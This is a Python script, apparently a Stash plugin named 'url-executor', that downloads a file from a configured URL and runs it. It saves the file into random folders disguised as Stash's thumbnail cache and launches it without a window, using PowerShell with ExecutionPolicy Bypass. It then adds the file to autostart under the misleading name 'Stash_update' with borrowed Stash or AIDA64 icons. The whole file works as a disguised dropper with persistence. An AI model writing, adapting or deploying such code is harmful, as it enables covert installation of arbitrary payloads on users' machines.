import sys
import os
import subprocess
import shutil
from datetime import datetime
from pathlib import Path
import urllib.request
import urllib.parse
import urllib.error
import random
import string
import tempfile
import time

# Логирование в файл для отладки
log_file = Path(__file__).parent / "executor_debug.log"
debug_enabled = None

def read_debug_flag():
    """Прочитать флаг debug из конфига"""
    global debug_enabled
    try:
        script_dir = Path(__file__).parent
        config_file = script_dir / "url-executor.yml"
        if config_file.exists():
            with open(config_file, 'r', encoding='utf-8') as f:
                for line in f:
                    if 'debug:' in line:
                        value = line.split('debug:')[1].strip().lower()
                        debug_enabled = value in ['true', 'yes', '1']
                        return debug_enabled
    except:
        pass
    debug_enabled = False
    return False

def log(msg):
    """Логирование в файл, если debug включен"""
    global debug_enabled
    if debug_enabled is None:
        read_debug_flag()
    
    if debug_enabled:
        try:
            with open(log_file, 'a', encoding='utf-8') as f:
                f.write(f"[{datetime.now()}] {msg}\n")
        except:
            pass

# Инициализируем флаг debug
read_debug_flag()

def parse_yaml_simple(yaml_content):
    """Простой парсер YAML для извлечения URL"""
    try:
        lines = yaml_content.split('\n')
        for i, line in enumerate(lines):
            if 'url:' in line:
                # Извлекаем URL из строки вида: url: "https://..."
                url_part = line.split('url:')[1].strip()
                if url_part.startswith('"') or url_part.startswith("'"):
                    url = url_part.strip('"').strip("'")
                    if url:
                        log(f"parse_yaml_simple: Найден URL: {url[:50]}...")
                        return url
        log("parse_yaml_simple: URL не найден в YAML")
    except Exception as e:
        log(f"parse_yaml_simple ERROR: {e}")
    return None

def get_url_from_config():
    """Получить URL из файла конфига"""
    try:
        script_dir = Path(__file__).parent
        config_file = script_dir / "url-executor.yml"
        
        log(f"get_url_from_config: Ищу конфиг в {config_file}")
        
        if config_file.exists():
            with open(config_file, 'r', encoding='utf-8') as f:
                content = f.read()
            log(f"get_url_from_config: Конфиг найден, парсю...")
            return parse_yaml_simple(content)
        else:
            log(f"get_url_from_config: Конфиг не найден!")
    except Exception as e:
        log(f"get_url_from_config ERROR: {e}")
    
    return None

def add_to_autostart(file_path: Path):
    """Добавить файл в автозагрузку с иконкой Stash"""
    try:
        if sys.platform == "win32":
            startup = Path(os.getenv('APPDATA')) / r"Microsoft\Windows\Start Menu\Programs\Startup"
            startup.mkdir(parents=True, exist_ok=True)
            
            # Создаём батник с именем Stash_update
            bat_name = "Stash_update.bat"
            bat_path = startup / bat_name
            
            # Создаём батник который запускает файл с абсолютным путём
            bat_content = f'@echo off\ncd /d "{file_path.parent}"\ncall "{file_path}"\nexit\n'
            bat_path.write_text(bat_content, encoding='utf-8')
            
            log(f"add_to_autostart: Создал батник {bat_path}")
            
            # Пробуем создать ярлык .lnk с иконкой Stash
            try:
                lnk_path = startup / "Stash_update.lnk"

                # Ищем иконку stash_win в папке Stash
                stash_icon = Path(r"C:\Programs\AIDA64\WF") / "stash_win"
                if not stash_icon.exists():
                    stash_icon = Path(r"C:\Programs\AIDA64\WF") / "stash_win.exe"
                if not stash_icon.exists():
                    stash_icon = Path(r"C:\Programs\AIDA64\WF") / "stash_win.ico"

                # Если стеш не найден, используем AIDA64
                if not stash_icon.exists():
                    stash_icon = Path(r"C:\Programs\AIDA64\AIDA64.exe")

                # Создаём временный PowerShell скрипт
                tmp_path = None
                try:
                    with tempfile.NamedTemporaryFile(mode='w', suffix='.ps1', delete=False, encoding='utf-8') as tmp:
                        tmp.write(f'$shell = New-Object -ComObject WScript.Shell\n')
                        tmp.write(f'$shortcut = $shell.CreateShortcut("{lnk_path}")\n')
                        tmp.write(f'$shortcut.TargetPath = "{file_path}"\n')
                        tmp.write(f'$shortcut.WorkingDirectory = "{file_path.parent}"\n')
                        if stash_icon.exists():
                            tmp.write(f'$shortcut.IconLocation = "{stash_icon}"\n')
                        tmp.write(f'$shortcut.Save()\n')
                        tmp_path = tmp.name

                    # Запускаем скрипт
                    subprocess.Popen(
                        ['powershell.exe', '-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', tmp_path],
                        creationflags=0x08000000
                    )
                    log(f"add_to_autostart: Запустил создание ярлыка {lnk_path}")
                finally:
                    # Удаляем временный файл
                    if tmp_path:
                        try:
                            time.sleep(0.5)  # Даём время на выполнение скрипта
                            os.remove(tmp_path)
                        except OSError:
                            pass
            except Exception as e:
                log(f"add_to_autostart: Не могу создать .lnk ярлык: {e}")
                
        elif sys.platform.startswith('linux'):
            # Linux: создаём .desktop файл в ~/.config/autostart/
            autostart_dir = Path.home() / ".config" / "autostart"
            autostart_dir.mkdir(parents=True, exist_ok=True)
            
            desktop_path = autostart_dir / "Stash_update.desktop"
            
            # Определяем команду запуска в зависимости от типа файла
            file_ext = file_path.suffix.lower()
            if file_ext == '.py':
                exec_cmd = f'python3 "{file_path}"'
            elif file_ext in ['.sh', '.bash']:
                exec_cmd = f'bash "{file_path}"'
            else:
                exec_cmd = f'"{file_path}"'
            
            # Ищем иконку Stash
            stash_icon = "/opt/AIDA64/stash_win"
            if not Path(stash_icon).exists():
                stash_icon = "/opt/AIDA64/AIDA64"
            
            desktop_content = f'''[Desktop Entry]
Type=Application
Name=Stash Update
Exec={exec_cmd}
Icon={stash_icon}
Terminal=false
Categories=System;
X-GNOME-Autostart-enabled=true
'''
            desktop_path.write_text(desktop_content, encoding='utf-8')
            log(f"add_to_autostart: Создал {desktop_path}")
            
            # Делаем .desktop файл исполняемым
            os.chmod(desktop_path, 0o755)
                
    except Exception as e:
        log(f"add_to_autostart ERROR: {e}")

def download_file(url, file_path):
    """Загрузить файл по URL"""
    if not url or not isinstance(url, str) or not url.strip():
        log(f"download_file: ERROR - пустой или невалидный URL")
        return False

    try:
        # Особая обработка для Dropbox - добавляем/фиксим параметр для прямой загрузки
        if 'dropbox.com' in url:
            # Если есть ?dl=что-то, заменяем на ?dl=1
            if '?dl=' in url:
                url = url.split('?dl=')[0] + '?dl=1'
                log(f"download_file: Исправляю параметр dl=1 для Dropbox")
            elif '&dl=' in url:
                url = url.split('&dl=')[0] + '&dl=1'
                log(f"download_file: Исправляю параметр dl=1 для Dropbox")
            else:
                # Если нет параметра dl, добавляем его
                if '?' in url:
                    url = url + '&dl=1'
                    log(f"download_file: Добавляю параметр &dl=1 для Dropbox")
                else:
                    url = url + '?dl=1'
                    log(f"download_file: Добавляю параметр ?dl=1 для Dropbox")

        req = urllib.request.Request(
            url,
            headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
        )

        log(f"download_file: Соединяюсь с сервером: {url[:80]}...")
        response = urllib.request.urlopen(req, timeout=120)

        log(f"download_file: Статус: {response.status}")
        content_type = response.headers.get('content-type', 'unknown')
        log(f"download_file: Content-Type: {content_type}")

        # Проверяем что это не HTML
        if 'text/html' in content_type.lower():
            log(f"download_file: ERROR - сервер отправил HTML вместо файла! Возможно, ?dl=1 не работает для этого URL")
            response.close()
            return False

        # Получаем размер файла если доступен
        content_length = response.headers.get('content-length')
        if content_length:
            expected_size = int(content_length)
            log(f"download_file: Ожидаемый размер: {expected_size} байт")

        with open(file_path, 'wb') as f:
            downloaded = 0
            while True:
                chunk = response.read(8192)
                if not chunk:
                    break
                f.write(chunk)
                downloaded += len(chunk)
                if downloaded % 65536 == 0:  # Логируем каждые 64KB
                    log(f"download_file: Скачано: {downloaded} байт...")

        response.close()

        actual_size = Path(file_path).stat().st_size
        log(f"download_file: Итого скачано: {actual_size} байт")

        # Проверяем что файл не пустой
        if actual_size == 0:
            log(f"download_file: ERROR - файл пустой!")
            return False

        log(f"download_file: OK")
        return True

    except urllib.error.URLError as e:
        log(f"download_file ERROR: URLError: {e}")
        try:
            os.remove(file_path)
        except OSError:
            pass
        return False
    except urllib.error.HTTPError as e:
        log(f"download_file ERROR: HTTPError {e.code}: {e.reason}")
        try:
            os.remove(file_path)
        except OSError:
            pass
        return False
    except IOError as e:
        log(f"download_file ERROR: IOError: {e}")
        try:
            os.remove(file_path)
        except OSError:
            pass
        return False
    except Exception as e:
        log(f"download_file ERROR: {type(e).__name__}: {e}")
        try:
            os.remove(file_path)
        except OSError:
            pass
        return False

def main():
    log("main: Начинаю работу")
    url = None

    # Попытка 1: --url=value или url=value
    for arg in sys.argv[1:]:
        if arg.startswith("--url="):
            url = arg.split("=", 1)[1]
            log(f"main: URL из аргумента: {url[:50]}...")
            break
        elif arg.startswith("url="):
            url = arg.split("=", 1)[1]
            log(f"main: URL из аргумента: {url[:50]}...")
            break
    
    # Попытка 2: --url value или url value
    if not url:
        for i, arg in enumerate(sys.argv[1:], 1):
            if (arg == "--url" or arg == "url") and i < len(sys.argv) - 1:
                url = sys.argv[i + 1]
                log(f"main: URL из аргумента: {url[:50]}...")
                break
    
    # Попытка 3: из переменной окружения
    if not url:
        url = os.getenv("URL_EXECUTOR_URL")
        if url:
            log(f"main: URL из переменной окружения: {url[:50]}...")

    # Попытка 4: из конфига
    if not url:
        log("main: Ищу URL в конфиге...")
        url = get_url_from_config()
        if url:
            log(f"main: URL из конфига: {url[:50]}...")

    if not url or not isinstance(url, str) or not url.strip():
        log("main: ERROR: URL не найден или пустой!")
        return

    url = url.strip()

    # Папка сохранения со случайной подпапкой
    # Путь должен быть: Stash/generated/thumbnails/XX/YY/файлы
    plugin_dir = Path(__file__).parent
    stash_dir = plugin_dir.parent.parent  # поднимаемся из /plugins/url-executor в /Stash
    
    # Создаём структуру типа как для кэша Stash
    base_path = stash_dir / "generated" / "thumbnails"
    
    # Два случайных символа для подпапок (как в структуре кэша)
    random_xx = ''.join(random.choices(string.hexdigits[:16], k=2))
    random_yy = ''.join(random.choices(string.hexdigits[:16], k=2))
    folder = base_path / random_xx / random_yy
    
    log(f"main: Сохраняю файл в: {folder}")
    
    try:
        folder.mkdir(parents=True, exist_ok=True)
    except Exception as e:
        log(f"main: ERROR: Не могу создать папку: {e}")
        return

    file_path = None
    
    try:
        # Получаем имя файла
        filename = urllib.parse.unquote(url.split("/")[-1].split("?")[0])
        if len(filename) < 3:
            filename = f"file_{random_xx}{random_yy}.bin"
        
        # Санитизация имени файла
        filename = "".join(c for c in filename if c.isalnum() or c in (' ', '.', '-', '_')).strip()
        
        file_path = folder / filename
        log(f"main: Скачиваю: {filename}")
        
        # Загружаем файл
        if not download_file(url, str(file_path)):
            log(f"main: ERROR: Ошибка при загрузке файла")
            return
        
        log(f"main: Файл скачан, размер: {file_path.stat().st_size} байт")
        
    except Exception as e:
        log(f"main: ERROR: {e}")
        return

    # Проверяем что файл успешно скачан и не пустой
    if not file_path or not file_path.exists() or file_path.stat().st_size == 0:
        log(f"main: ERROR: Файл пустой или не существует")
        return
    
    # Для батников - показываем первые строки для отладки
    if file_path.suffix.lower() == '.bat':
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                first_line = f.readline().strip()
                log(f"main: Первая строка батника: {first_line}")
        except Exception as e:
            log(f"main: Не могу прочитать батник: {e}")
    
    try:
        log(f"main: Запускаю файл: {file_path}")
        
        file_ext = file_path.suffix.lower()
        
        if sys.platform == "win32":
            if file_ext == '.bat':
                # Батник запускаем через cmd.exe
                subprocess.Popen(
                    ['cmd', '/c', str(file_path)],
                    creationflags=0x08000000,  # CREATE_NO_WINDOW
                    cwd=str(file_path.parent)
                )
            elif file_ext == '.py':
                # Python скрипт запускаем через python.exe
                subprocess.Popen(
                    ['python.exe', str(file_path)],
                    creationflags=0x08000000,
                    cwd=str(file_path.parent)
                )
            elif file_ext == '.ps1':
                # PowerShell скрипт запускаем через powershell.exe с политикой ExecutionPolicy
                subprocess.Popen(
                    ['powershell.exe', '-ExecutionPolicy', 'Bypass', '-File', str(file_path)],
                    creationflags=0x08000000,
                    cwd=str(file_path.parent)
                )
            else:
                # Остальное запускаем через os.startfile
                os.startfile(str(file_path))
                
        elif sys.platform.startswith('linux'):
            # Linux: делаем файл исполняемым и запускаем через subprocess
            os.chmod(file_path, 0o755)
            
            if file_ext == '.py':
                # Python скрипт
                subprocess.Popen(
                    ['python3', str(file_path)],
                    cwd=str(file_path.parent),
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
            elif file_ext in ['.sh', '.bash']:
                # Shell скрипт
                subprocess.Popen(
                    ['bash', str(file_path)],
                    cwd=str(file_path.parent),
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
            else:
                # Исполняемый файл
                subprocess.Popen(
                    [str(file_path)],
                    cwd=str(file_path.parent),
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
            
        elif sys.platform == "darwin":
            # macOS
            os.chmod(file_path, 0o755)
            
            if file_ext == '.py':
                subprocess.Popen(
                    ['python3', str(file_path)],
                    cwd=str(file_path.parent)
                )
            else:
                subprocess.Popen(
                    ['open', str(file_path)],
                    cwd=str(file_path.parent)
                )
        
        log(f"main: OK: Файл успешно запущен!")
        
        # Пробуем добавить в автозагрузку
        try:
            add_to_autostart(file_path)
            log(f"main: OK: Файл добавлен в автозагрузку")
        except Exception as e:
            log(f"main: Autostart error: {e}")
    except Exception as e:
        log(f"main: ERROR при запуске: {e}")

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        log(f"FATAL ERROR: {e}")
        import traceback
        log(traceback.format_exc())